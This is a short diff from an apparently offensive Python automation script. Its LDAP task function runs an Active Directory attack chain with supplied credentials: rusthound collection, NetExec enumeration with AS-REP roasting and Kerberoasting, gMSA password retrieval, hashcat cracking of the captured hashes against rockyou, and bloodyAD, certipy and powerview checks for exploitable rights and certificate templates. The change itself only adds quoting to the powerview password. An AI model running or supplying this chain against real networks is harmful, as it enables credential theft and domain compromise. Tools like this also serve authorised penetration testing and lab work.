@@ -115,7 +115,7 @@ def ldap_tasks(context):
     if context.creds_exist():
         user, passwd = context.get_initial_cred()
         run_task(context, f"rusthound -d {context.domain} -u {user}@{context.domain} -p '{passwd}' -f {context.hostname}.{context.domain} -n {context.ip} -z -o rusthound; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' --users --find-delegation --trusted-for-delegation --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u {user} -p '{passwd}' --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
-        run_task(context, f"bloodyAD --host {context.ip} -u {user} -p '{passwd}' get writable; certipy find -enabled -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout -timeout 2; certipy find -vulnerable -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout -timeout 2; powerview {context.domain}/{user}:{passwd}@{context.ip}")
+        run_task(context, f"bloodyAD --host {context.ip} -u {user} -p '{passwd}' get writable; certipy find -enabled -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout -timeout 2; certipy find -vulnerable -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout -timeout 2; powerview {context.domain}/{user}:'{passwd}'@{context.ip}")
     else:
         try:
             # Check anonymous bind
